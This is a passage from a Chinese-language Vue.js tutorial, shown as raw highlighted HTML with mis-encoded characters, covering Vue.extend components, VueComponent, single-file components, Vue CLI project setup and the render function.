class="language-xml"><span class="language-handlebars">  const student = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    name: &#x27;student&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>å­¦ç”Ÿå§“åï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>å­¦ç”Ÿå¹´é¾„ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;name: &#x27;å°šç¡…è°·&#x27;,age: 18&#125;&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //å®šä¹‰schoolç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">  const school = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    name: &#x27;school&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­¦æ ¡åç§°ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;name: &#x27;å°šç¡…è°·&#x27;,address: &#x27;åŒ—äº¬&#x27;&#125;&#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">    //æ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨ï¼‰</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; student &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //å®šä¹‰helloç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">  const hello = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">msg</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;msg: &#x27;æ¬¢è¿æ¥åˆ°å°šç¡…è°·å­¦ä¹ ï¼&#x27;&#125;&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //å®šä¹‰appç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">  const app = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; school, hello &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //åˆ›å»ºvm</span></span><br><span class="language-xml"><span class="language-handlebars">  new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    el: &#x27;#root&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">app</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">app</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    //æ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨ï¼‰</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; app &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="VueComponent"><a href="#VueComponent" class="headerlink" title="VueComponent"></a>VueComponent</h3><ul><li>schoolç»„ä»¶æœ¬è´¨æ˜¯ä¸€ä¸ªåä¸ºVueComponentçš„æ„é€ å‡½æ•°ï¼Œä¸”ä¸æ˜¯ç¨‹åºå‘˜å®šä¹‰çš„ï¼Œæ˜¯Vue.extendç”Ÿæˆçš„ã€‚</li><li>æˆ‘ä»¬åªéœ€è¦å†™æˆ–ï¼ŒVueè§£ææ—¶ä¼šå¸®æˆ‘ä»¬åˆ›å»ºschoolç»„ä»¶çš„å®ä¾‹å¯¹è±¡ï¼Œå³Vueå¸®æˆ‘ä»¬æ‰§è¡Œçš„ï¼šnew VueComponent(options)ã€‚</li><li>ç‰¹åˆ«æ³¨æ„ï¼šæ¯æ¬¡è°ƒç”¨Vue.extendï¼Œè¿”å›çš„éƒ½æ˜¯ä¸€ä¸ª&#x3D;&#x3D;å…¨æ–°çš„VueComponent&#x3D;&#x3D;ï¼ï¼ï¼ï¼(è¿™ä¸ªVueComponentå¯ä¸æ˜¯å®ä¾‹å¯¹è±¡)</li><li>å…³äºthisæŒ‡å‘ï¼š<ul><li>ç»„ä»¶é…ç½®ä¸­ï¼šdataå‡½æ•°ã€methodsä¸­çš„å‡½æ•°ã€watchä¸­çš„å‡½æ•°ã€computedä¸­çš„å‡½æ•° å®ƒä»¬çš„thiså‡æ˜¯ã€VueComponentå®ä¾‹å¯¹è±¡ã€‘ã€‚</li><li>new Vue(options)é…ç½®ä¸­ï¼šdataå‡½æ•°ã€methodsä¸­çš„å‡½æ•°ã€watchä¸­çš„å‡½æ•°ã€computedä¸­çš„å‡½æ•° å®ƒä»¬çš„thiså‡æ˜¯ã€Vueå®ä¾‹å¯¹è±¡ã€‘ã€‚</li></ul></li><li>VueComponentçš„å®ä¾‹å¯¹è±¡ï¼Œä»¥åç®€ç§°vcï¼ˆä¹Ÿå¯ç§°ä¹‹ä¸ºï¼šç»„ä»¶å®ä¾‹å¯¹è±¡ï¼‰ã€‚Vueçš„å®ä¾‹å¯¹è±¡ï¼Œä»¥åç®€ç§°vmã€‚</li></ul><p>Vue åœ¨å“ªç®¡ç† VueComponent</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121234720.png" alt="image-20221124121234720"></p><h3 id="ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»"><a href="#ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»" class="headerlink" title="ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»"></a>ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»</h3><ul><li>ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»ï¼šVueComponent.prototype. <strong>proto</strong> &#x3D;&#x3D;&#x3D; Vue.prototype</li><li>ä¸ºä»€ä¹ˆè¦æœ‰è¿™ä¸ªå…³ç³»ï¼šè®©ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼ˆvcï¼‰å¯ä»¥è®¿é—®åˆ° VueåŸå‹ä¸Šçš„å±æ€§ã€æ–¹æ³•ã€‚</li></ul><p>å¥½åƒç»§æ‰¿</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121316145.png" alt="image-20221124121316145"></p><h2 id="1-21-å•æ–‡ä»¶ç»„ä»¶"><a href="#1-21-å•æ–‡ä»¶ç»„ä»¶" class="headerlink" title="1.21 å•æ–‡ä»¶ç»„ä»¶"></a>1.21 å•æ–‡ä»¶ç»„ä»¶</h2><p>å•æ–‡ä»¶ç»„ä»¶å°±æ˜¯å°†ä¸€ä¸ªç»„ä»¶çš„ä»£ç å†™åœ¨ .vue è¿™ç§æ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œwebpack ä¼šå°† .vue æ–‡ä»¶è§£ææˆ html,css,jsè¿™äº›å½¢å¼ã€‚</p><p>æ¥åšä¸ªå•æ–‡ä»¶ç»„ä»¶çš„æ¡ˆä¾‹ï¼š</p><p><strong>School.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=&quot;UTF-8&quot; /&gt;<br>&lt;title&gt;ç»ƒä¹ ä¸€ä¸‹å•æ–‡ä»¶ç»„ä»¶çš„è¯­æ³•&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;!-- å‡†å¤‡ä¸€ä¸ªå®¹å™¨ --&gt;<br>&lt;div id=&quot;root&quot;&gt;&lt;/div&gt;<br>        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;<br>&lt;script type=&quot;text/javascript&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><strong>Student.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;h2&gt;å­¦ç”Ÿå§“åï¼š&#123;&#123;name&#125;&#125;&lt;/h2&gt;<br>        &lt;h2&gt;å­¦ç”Ÿå¹´é¾„ï¼š&#123;&#123;age&#125;&#125;&lt;/h2&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name: &#x27;Student&#x27;,<br>        data() &#123;<br>            return &#123;<br>                name: &#x27;xyy&#x27;,<br>                age: 18<br>            &#125;<br>        &#125;,<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p><strong>App.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>    &lt;School&gt;&lt;/School&gt;<br>    &lt;Student&gt;&lt;/Student&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    import School from &#x27;./school.vue&#x27;<br>    import Student from &#x27;./Student.vue&#x27;<br>    export default &#123;<br>        name: &#x27;App&#x27;,<br>        components: &#123;<br>            School,<br>            Student<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p><strong>main.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>    <span class="hljs-attr">template</span>: <span class="hljs-string">`&lt;App&gt;&lt;/App&gt;`</span>,<br>    <span class="hljs-attr">components</span>: &#123;<br>        <span class="hljs-title class_">App</span><br>    &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>index.htm</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç»ƒä¹ ä¸€ä¸‹å•æ–‡ä»¶ç»„ä»¶çš„è¯­æ³•<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å‡†å¤‡ä¸€ä¸ªå®¹å™¨ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="2-vueè„šæ‰‹æ¶ï¼Œè‡ªå®šä¹‰äº‹ä»¶ï¼Œæ’æ§½ç­‰å¤æ‚å†…å®¹"><a href="#2-vueè„šæ‰‹æ¶ï¼Œè‡ªå®šä¹‰äº‹ä»¶ï¼Œæ’æ§½ç­‰å¤æ‚å†…å®¹" class="headerlink" title="2. vueè„šæ‰‹æ¶ï¼Œè‡ªå®šä¹‰äº‹ä»¶ï¼Œæ’æ§½ç­‰å¤æ‚å†…å®¹"></a>2. vueè„šæ‰‹æ¶ï¼Œè‡ªå®šä¹‰äº‹ä»¶ï¼Œæ’æ§½ç­‰å¤æ‚å†…å®¹</h1><h2 id="2-1-åˆå§‹åŒ–è„šæ‰‹æ¶"><a href="#2-1-åˆå§‹åŒ–è„šæ‰‹æ¶" class="headerlink" title="2.1 åˆå§‹åŒ–è„šæ‰‹æ¶"></a>2.1 åˆå§‹åŒ–è„šæ‰‹æ¶</h2><p> 2.1.1. è¯´æ˜ </p><ol><li><p>Vueè„šæ‰‹æ¶æ˜¯Vueå®˜æ–¹æä¾›çš„æ ‡å‡†åŒ–å¼€å‘å·¥å…·ï¼ˆå¼€å‘å¹³å°ï¼‰</p></li><li><p>æœ€æ–°çš„ç‰ˆæœ¬æ˜¯ 4.x</p></li><li><p>æ–‡æ¡£ <a href="https://cli.vuejs.org/zh/">Vue CLI</a></p></li></ol><p> 2.1.2. å…·ä½“æ­¥éª¤ </p><ol><li><p>å¦‚æœä¸‹è½½ç¼“æ…¢è¯·é…ç½®npmæ·˜å®é•œåƒ<code>npm config set registry http://registry.npm.taobao.org</code></p></li><li><p>å…¨å±€å®‰è£… @vue&#x2F;cli <code>npm install -g @vue/cli</code></p></li><li><p>åˆ‡æ¢åˆ°åˆ›å»ºé¡¹ç›®çš„ç›®å½•ï¼Œä½¿ç”¨å‘½ä»¤åˆ›å»ºé¡¹ç›®<code>vue create xxx</code></p></li><li><p>é€‰æ‹©ä½¿ç”¨vueçš„ç‰ˆæœ¬</p></li><li><p>å¯åŠ¨é¡¹ç›®<code>npm run serve</code></p></li><li><p>æ‰“åŒ…é¡¹ç›®<code>npm run build</code></p></li><li><p>æš‚åœé¡¹ç›® Ctrl+C</p></li></ol><p>Vueè„šæ‰‹æ¶éšè—äº†æ‰€æœ‰webpackç›¸å…³çš„é…ç½®ï¼Œè‹¥æƒ³æŸ¥çœ‹å…·ä½“çš„webpacké…ç½®ï¼Œè¯·æ‰§è¡Œ<br>vue inspect &gt; output.js</p><h3 id="è„šæ‰‹æ¶æ–‡ä»¶ç»“æ„"><a href="#è„šæ‰‹æ¶æ–‡ä»¶ç»“æ„" class="headerlink" title="è„šæ‰‹æ¶æ–‡ä»¶ç»“æ„"></a>è„šæ‰‹æ¶æ–‡ä»¶ç»“æ„</h3>   <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">â”œâ”€â”€ node_modules <br>â”œâ”€â”€ public<br>â”‚   â”œâ”€â”€ favicon<span class="hljs-selector-class">.ico</span>: é¡µç­¾å›¾æ ‡<br>â”‚   â””â”€â”€ index<span class="hljs-selector-class">.html</span>: ä¸»é¡µé¢<br>â”œâ”€â”€ <span class="hljs-attribute">src</span><br>â”‚   â”œâ”€â”€ assets: å­˜æ”¾é™æ€èµ„æº<br>â”‚   â”‚   â””â”€â”€ logo<span class="hljs-selector-class">.png</span><br>â”‚   â”‚â”€â”€ component: å­˜æ”¾ç»„ä»¶<br>â”‚   â”‚   â””â”€â”€ HelloWorld<span class="hljs-selector-class">.vue</span><br>â”‚   â”‚â”€â”€ App<span class="hljs-selector-class">.vue</span>: æ±‡æ€»æ‰€æœ‰ç»„ä»¶<br>â”‚   â”‚â”€â”€ <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span>: å…¥å£æ–‡ä»¶<br>â”œâ”€â”€ <span class="hljs-selector-class">.gitignore</span>: gitç‰ˆæœ¬ç®¡åˆ¶å¿½ç•¥çš„é…ç½®<br>â”œâ”€â”€ babel<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.js</span>: babelçš„é…ç½®æ–‡ä»¶<br>â”œâ”€â”€ package<span class="hljs-selector-class">.json</span>: åº”ç”¨åŒ…é…ç½®æ–‡ä»¶ <br>â”œâ”€â”€ README<span class="hljs-selector-class">.md</span>: åº”ç”¨æè¿°æ–‡ä»¶<br>â”œâ”€â”€ package-lock.jsonï¼šåŒ…ç‰ˆæœ¬æ§åˆ¶æ–‡ä»¶<br><br></code></pre></td></tr></table></figure><h3 id="è„šæ‰‹æ¶demo"><a href="#è„šæ‰‹æ¶demo" class="headerlink" title="è„šæ‰‹æ¶demo"></a>è„šæ‰‹æ¶demo</h3><p>components:</p><p>å°±ç›´æ¥æŠŠå•æ–‡ä»¶ç»„ä»¶çš„ School.vue å’Œ Student.vue ä¸¤ä¸ªæ–‡ä»¶ç›´æ¥æ‹¿æ¥ç”¨ï¼Œä¸éœ€è¦ä¿®æ”¹ã€‚</p><p>App.vue:</p><p>å¼•å…¥è¿™ä¸¤ä¸ªç»„ä»¶ï¼Œæ³¨å†Œä¸€ä¸‹è¿™ä¸¤ä¸ªç»„ä»¶ï¼Œå†ä½¿ç”¨ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Vue logo&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./assets/logo.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School.vue&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">  <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title class_">School</span>,</span><br><span class="language-javascript">    <span class="hljs-title class_">Student</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-id">#app</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">font-family</span>: Avenir, Helvetica, Arial, sans-serif;</span><br><span class="language-css">  -webkit-<span class="hljs-attribute">font-smoothing</span>: antialiased;</span><br><span class="language-css">  -moz-osx-<span class="hljs-attribute">font-smoothing</span>: grayscale;</span><br><span class="language-css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;</span><br><span class="language-css">  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">60px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>main.js:</p><p>å…¥å£æ–‡ä»¶</p><p>Cli5.0.8ç‰ˆæœ¬</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">import &#123; createApp &#125; from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>createApp(App).mount(&#x27;#app&#x27;)<br><br></code></pre></td></tr></table></figure><p>Cli4+</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">import Vue from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>Vue.config.productionTip = false<br><br>new Vue(&#123;<br>  render: h =&gt; h(App),<br>&#125;).$mount(&#x27;#app&#x27;)<br><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦è¯¦ç»†è®²è§£ main.js ä¸­çš„ render å‡½æ•°</p><h3 id="renderå‡½æ•°"><a href="#renderå‡½æ•°" class="headerlink" title="renderå‡½æ•°"></a>renderå‡½æ•°</h3><blockquote><p>æ’å…¥ä¸€ä¸ªå°çŸ¥è¯†ï¼š</p></blockquote><p>ä½¿ç”¨ import å¯¼å…¥ç¬¬ä¸‰æ–¹åº“çš„æ—¶å€™ä¸éœ€è¦ åŠ  â€˜.&#x2F;â€™</p><p>å¯¼å…¥æˆ‘ä»¬è‡ªå·±å†™çš„ï¼š</p><p>  â€‹    import App from â€˜.&#x2F;App.vueâ€™</p><p>å¯¼å…¥ç¬¬ä¸‰æ–¹çš„</p><p>â€‹      import Vue from â€˜vueâ€™</p><p>ä¸éœ€è¦åœ¨ from â€˜vueâ€™ åŠ  <code>&#39;./&#39;</code> çš„åŸå› æ˜¯ç¬¬ä¸‰æ–¹åº“ node_modules äººå®¶å¸®æˆ‘ä»¬é…ç½®å¥½äº†ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ import å¯¼å…¥ç¬¬ä¸‰æ–¹åº“ï¼Œåœ¨ç¬¬ä¸‰æ–¹åº“çš„ package.json æ–‡ä»¶ä¸­ç¡®å®šäº†æˆ‘ä»¬å¼•å…¥çš„æ˜¯å“ªä¸ªæ–‡ä»¶<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121422825.png" alt="image-20221124121422825"></p><p>é€šè¿‡ module ç¡®å®šäº†æˆ‘ä»¬è¦å¼•å…¥çš„æ–‡ä»¶ã€‚</p><blockquote><p>å›åˆ° render å‡½æ•°</p></blockquote><p>ä¹‹å‰çš„å†™æ³•æ˜¯è¿™æ ·ï¼š</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 